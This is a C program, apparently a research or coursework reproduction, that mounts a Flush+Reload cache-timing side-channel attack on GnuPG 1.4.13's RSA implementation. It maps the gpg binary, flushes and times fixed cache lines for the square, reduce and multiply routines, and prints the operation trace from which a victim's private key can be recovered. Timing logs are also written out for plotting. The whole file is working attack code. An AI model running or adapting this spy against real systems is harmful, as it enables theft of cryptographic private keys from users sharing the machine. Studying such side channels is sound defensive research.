/*
	compile using gcc -std=gnu99 -O2 -g -lm spy.c
	gnupg required 1.4.13
	file: gnupg/ipher/rsa.c
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <strings.h>
#include <signal.h> 

#define NTIMING 100000
#define CUTOFF 170

char *fileName = "/usr/local/bin/gpg";
int noffsets=4;
unsigned long offsets[]={0x09BCD0, 0x09EC87, 0x09DCC4, 0x09E783};
char chars[]={'P','S','R','M'};
int slotSize=2048;

inline unsigned long gettime(){
	volatile unsigned long tl;
	asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
	return tl;
}

inline int probe(char *adrs) {
	volatile unsigned long time;

	asm __volatile__ (
		"  mfence             \n" // orders all memory access, lfence instructions and the clflush instruction.
		"  lfence             \n" // Load preceding have completed 
		"  rdtsc              \n"
		"  lfence             \n"
		"  movl %%eax, %%esi  \n"
		"  movl (%1), %%eax   \n"
		"  lfence             \n"
		"  rdtsc              \n"
		"  subl %%esi, %%eax  \n"
		"  clflush 0(%1)      \n"
		: "=a" (time)
		: "c" (adrs)
		:  "%esi", "%edx");
	return time;
}

inline void flush(char *adrs) {
	asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}


void *map(const char *fn) {
	int fd = open(fn, O_RDONLY);
	if (fd < 0) {
		perror(fn);
		exit(1);
	}
	struct stat st_buf;
	fstat(fd, &st_buf);
	int size = st_buf.st_size;

	void *rv = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	printf("Mapped at %p (0x%x)\n", rv, size);
	return rv;
}

FILE *fs;
FILE *fr;
FILE *fm;
long r[100000],s[100000],m[100000],slotnum[100000];

// Registering Signal to dump output into a file

void handle_sigint(int sig) 
{ 
	printf("Caught signal %d\n", sig); 
	for(int i=0;i<1000;i++){
		fprintf(fs, "%li %li\n",slotnum[i], s[i]);
		fprintf(fr, "%li %li\n",slotnum[i], r[i]);
		fprintf(fm, "%li %li\n",slotnum[i], m[i]);
	}
	exit(0);
} 
int main(int c, char **v) {
	// Ploting
	fs = fopen("square.txt", "wb");
	fr = fopen("reduce,txt", "wb");
	fm = fopen("multiply.txt", "wb");
	signal(SIGINT, handle_sigint); 

	char *ip = map(fileName);
	char **ptrs = malloc(sizeof(char *) * noffsets);
	int i;
	for (i = 0; i < noffsets; i++)
		ptrs[i] = ip + ((offsets[i]) & ~0x3f); // The lines which need to be probed
	int *times = malloc(sizeof(long) * noffsets);
	int *touched = malloc(sizeof(int) * noffsets);
	int n = 0;
	int timing = 0;
	unsigned long slotstart;
	unsigned long current;
	int hit;
	//Fast io
	char *buffer=malloc(NTIMING);
	setvbuf(stdout, buffer, _IOLBF, NTIMING);

	for (i = 0; i < noffsets; i++)
		flush(ptrs[i]);
	slotstart = gettime();

	unsigned long slot=0,slotn=0;;
	while (1) {
		hit = 0;
		slotn++;
		for (i = 0; i < noffsets; i++) { // probe and compare with CUTOFF
			times[i] = probe(ptrs[i]);
			touched[i] = (times[i] < CUTOFF);
			hit |= touched[i];
		}
		// Use for the propose of plotting
		if(hit && slot<100000){
			slot++;
			slotnum[slot]=slotn;
			for (i = 0; i < noffsets; i++) {
				if(i==1)      s[slot]=times[i];
				else if(i==2) r[slot]=times[i];
				else if(i==3) m[slot]=times[i];
			}
		}
		for (i = 0; i < noffsets; i++)
			if (touched[i])
				putchar(chars[i]);

		if (hit) {
			putchar('|');
			n = 100;
		} else if (n) {
			putchar('|');
			if (--n == 0) {
				putchar('\n');
			}
		}

		do {
			current = gettime();
		} while (current - slotstart < slotSize);
		slotstart += slotSize;
	}
}
